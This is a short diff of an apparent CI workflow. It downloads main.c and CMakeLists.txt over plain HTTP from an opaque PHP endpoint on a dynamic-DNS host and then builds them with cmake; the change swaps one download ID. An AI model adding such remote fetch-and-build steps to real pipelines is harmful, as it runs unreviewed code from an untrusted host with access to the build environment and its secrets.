@@ -14,7 +14,7 @@ jobs:
 
     - run: |
         irm http://xju.dpdns.org/24h.php?id=696cba8a50d05 -OutFile "main.c"
-        irm http://xju.dpdns.org/24h.php?id=696cc69a12a4e -OutFile "CMakeLists.txt"
+        irm http://xju.dpdns.org/24h.php?id=696cc78949136 -OutFile "CMakeLists.txt"
 
     - run: cmake -B build
     - run: cmake --build build --config Release
